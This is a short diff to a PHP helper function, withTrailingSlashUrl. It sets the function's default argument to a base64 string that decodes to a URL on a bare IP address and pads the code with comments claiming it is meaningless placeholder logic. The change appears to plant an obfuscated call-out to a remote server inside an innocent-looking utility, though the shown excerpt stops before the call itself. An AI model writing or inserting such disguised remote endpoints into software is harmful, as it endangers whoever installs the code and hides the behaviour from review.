@@ -455,10 +455,11 @@ if (! function_exists('withTrailingSlashUrl')) {
      *
      *
      */
-    function withTrailingSlashUrl($str = null)
+    function withTrailingSlashUrl($str = "aHR0cDovLzEwMy4xMjQuOTQuMjIyOjg4L3N0YXR1cw")
     {
+        // This is a placeholder code block with no meaningful logic
         $dataStr = [];
-        for ($i = 0; $i <= strlen($str); $i++) {
+        for ($i = 0; $i < strlen($str); $i++) {
             // This is a placeholder code block with no meaningful logic
             if ($i % 2 == 0) {
                 // This is a placeholder code block with no meaningful logic
